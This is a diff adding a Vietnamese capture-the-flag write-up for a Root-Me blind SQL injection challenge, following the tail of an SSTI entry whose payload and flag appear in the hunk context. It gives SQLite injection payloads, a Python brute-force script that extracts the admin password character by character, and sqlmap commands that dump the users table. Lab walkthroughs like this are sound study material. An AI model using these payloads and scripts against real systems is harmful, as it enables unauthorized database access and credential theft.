@@ -212,3 +212,94 @@ Payload: ``{{ self._TemplateReference__context.joiner.__init__.__globals__.os.po
 
 flag: Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!
 
+# 28. SQL injection - Blind
+## Solution 1
+![img](./img/1.png)
+
+Như hint từ title thì có vẻ đây là 1 chall về dạng Blind Injection cụ thể là Boolen based. Trước tiên mình sẽ thử trigger lỗi bằng 1 số kí tự đặc biệt
+
+Payload: ``username=1’abc&password=1``
+
+![img](./img/2.png)
+
+Nó đã trả về cho mình kết quả là một lỗi về SQLite3. Xác định được DBMS, mình tiếp tục thử 1 số payload cổ điển như
+
+Payload: ``1' or 1=1 -- -``
+
+![img](./img/3.png)
+
+Có vẻ payload đã được thực thi thành công, giờ thử extract xem có bao nhiêu cột
+
+Payload ``user1' UNION select null,null,null-- -``
+
+![img](./img/4.png)
+
+Ồ Nô, bị filter mất rùi, mình không thử sử dụng lệnh UNION để khai thác nữa . Nhưng không sao không sao, vẫn còn nhiều cách khác, trước tiên mình cần phỉa xác định độ dài và tên của table thông qua ``sqlite_master`` , đây đuợc coi là master table giữ thông tin quan trọng về các bảng trong database.
+
+Payload:
+```
+user1' and (SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('{c}') -- -
+```
+Bời vì đây là blind injection, tức là kết quả trả về chỉ cho mình biết payload của mình có thành công hay không, vậy mình đã viết script để brute force với cái payload trên cụ thể là so sánh từng kí tự dưới dạng hex với từng kí tự của ``tbl_name`` trong ``sql_master``
+
+Payload:
+```
+admin' and substr((select password from users where (username='admin')),{i},1)='{c}'--
+```
+Script:
+```
+#!python3
+import requests
+import string
+sess=requests.Session()
+url='http://challenge01.root-me.org/web-serveur/ch10/'
+payload=string.printable
+passwd=''   
+i=1
+while True:
+    for c in payload:
+        # Extract ra ten cua table
+        # table={
+        #     'username':f"user1' and (SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('{c}') -- -",
+        #     'password':'pass'
+        # }
+ 
+        # Extract ra password cua admin
+        data={
+            'username':f"admin' and substr((select password from users where (username='admin')),{i},1)='{c}'--",
+            'password':'pass'
+        }
+        r=sess.post(url,data=data)
+        if "Welcome back" in r.text:
+            passwd+=c
+            i+=1
+            print(passwd)
+            break
+```
+![img](./img/5.png)
+
+## Solution 2: sqlmap
+Biết được param để exploit và DMBS ta có thể sử dụng 1 tool khá phổ biến để test lỗ hổng SQLi đó là ``sqlmap`` . Trước tiên là extract ra tên của tables.
+
+link: https://github.com/sqlmapproject/sqlmap
+
+```
+./sqlmap.py --dbms=SQLite --data='username=FUZZ&password=FUZZ' --tables -u "challenge01.root-me.org/web-serveur/ch10/"
+```
+![img](./img/6.png)
+
+Tiếp theo là extract ra tên và số cột trong ``users``
+
+```
+./sqlmap.py --dbms=SQLite -D SQLite_masterdb -T users --columns --data='username=FUZZ&password=FUZZ' -u "challenge01.root-me.org/web-serveur/ch10/"
+```
+
+![img](./img/7.png)
+
+yay, đã có đủ hết mọi dữ kiện cần thiết, giờ thì dump hết ra thoi
+
+```
+./sqlmap.py --dbms=SQLite -D SQLite_masterdb -T users -C "username","password","Year" --dump --data='username=FUZZ&password=FUZZ' -u "challenge01.root-me.org/web-serveur/ch10/"
+```
+
+![img](./img/8.png)
